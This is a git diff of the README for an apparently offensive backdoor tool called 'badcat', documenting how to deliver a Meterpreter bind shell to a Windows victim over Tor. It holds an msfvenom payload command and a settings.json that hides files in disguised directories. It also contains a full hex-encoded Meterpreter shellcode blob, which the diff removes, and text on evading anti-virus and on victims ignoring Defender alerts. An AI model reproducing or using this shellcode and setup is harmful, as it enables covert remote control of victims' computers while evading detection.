@@ -211,14 +211,14 @@ IMAGE
 
 ### 2. Connect through a meterpreter session
 
-Using meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
+Using Meterpreter gives you a full-featured remote administration, but it's well known and blocked by most anti-viruses. With badcat, you evade - as far as I can tell - almost all anti-virus detection because you only decrypt and execute the payload after the _attacker_ connects.
 
-The steps to use a meterpreter shellcode is exactly the same as in example 1.
+The steps to use a Meterpreter shellcode is exactly the same as in example 1.
 
-Generate the shellcode as hexadecimal using `msfvenom`:
+Generate the shellcode as raw bytes with `msfvenom`:
 
 ```bash
-$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f hex
+$ msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f raw -o payload.bin
 ```
 
 Then enable payload at your `settings.json` and update them to reflect your payload and bind port - using port `6666` for the purpose of this example:
@@ -228,21 +228,15 @@ Then enable payload at your `settings.json` and update them to reflect your payl
     "name": "my meterpreter",
     "hosts_file": "../hosts.json",
     "tor": {
-        "build_for_windows": true,
-        "download_url": {
-            "windows": "file://tor-windows",
-            "linux": "file://tor-linux/"
-        },
-        "destination_dir": {
+        "spoof_dir": {
             "windows": "AppData\\Local\\Microsoft",
             "linux": ".local/share/Trash/.repo"
         },
         "rc_file": "torrc",
-        "executable": "myAmazingApp"
     },
     "payload": {
         "enabled": true,
-        "hex": "fc4881e4f0ffffffe8cc0000004151415052514831d265488b5260488b521856488b5220480fb74a4a4d31c9488b72504831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d0668178180b020f85720000008b80880000004885c074674801d08b481850448b40204901d0e3564d31c948ffc9418b34884801d64831c041c1c90dac4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e94bffffff5d49be7773325f3332000041564989e64881eca00100004989e54831c0505049c7c402001a0a41544989e44c89f141ba4c772607ffd54c89ea68010100005941ba29806b00ffd56a025950504d31c94d31c048ffc04889c241baea0fdfe0ffd54889c76a1041584c89e24889f941bac2db3767ffd54831d24889f941bab7e938ffffd54d31c04831d24889f941ba74ec3be1ffd54889f94889c741ba756e4d61ffd54881c4b00200004883ec104889e24d31c96a0441584889f941ba02d9c85fffd54883c4205e89f66a404159680010000041584889f24831c941ba58a453e5ffd54889c34989c74d31c94989f04889da4889f941ba02d9c85fffd54801c34829c64885f675e141ffe7586a005949c7c2f0b5a256ffd5",
+        "file": "../payload.bin",
         "bind_port": "6666"
     }
 }
@@ -250,22 +244,13 @@ Then enable payload at your `settings.json` and update them to reflect your payl
 
 Now compile your _backdoor_ and deliver as usual.
 
-When connecting, the attacker toolkit will execute the payload for you, but nothing will really show up. Instead you'll be able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 9999 in our example.
+In the moment the _attacker_ connects and payload is going be executed on the _victim_, one may see the common Microsoft Windows Defender Alert, ilustrated on figure 4. This alert is extremelly generic, and users tend to ignore such alerts because it does not say it's a malware. But thats kind of funny that the payload was already executed and the port is listening in the background. And even if one does not `Allow access`, the payload keeps running and Windows does nothing about it.
 
-```bash
-$ ./attacker -f hosts.json
-Badcat attacker toolkit. Connect to your hosts
-Type help for commands.
+IMAGE
 
-# list
-0 my meterpreter true  anjgnj
-# connect 0
-trying to connect (attempt 0)...
-connected to: Ip(0.0.0.0:0)
-Your payload should be accessible now at: aqti2jzrbmniqsnwmi3zmxxy3edynawa472ywdj42nk2wox6akpkodqd.onion:PAYLOAD_PORT
-```
+After `Canceling` or `Allowing access` through Microsoft Windows Defender Alert, you are able to connect directly to your meterpreter session using the onion address and the port as `settings.payload.bind_port` 6666 in our example.
 
-After you have connected, fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_.
+Fire up `msfconsole` - using `proxychains` or something similar - in order to open a meterpreter session through the Tor network. It's fundamental that msfconsole is proxied through the Tor network or one will not be able to connect to the _server_. After opened configure a handler for your payload and exploit it.
 
-![Msfconsole opened with session from badcat](https://user-images.githubusercontent.com/28604565/143482772-40267d27-9e9e-4f41-80e9-c956e5432be0.png)
+IMAGE2
 
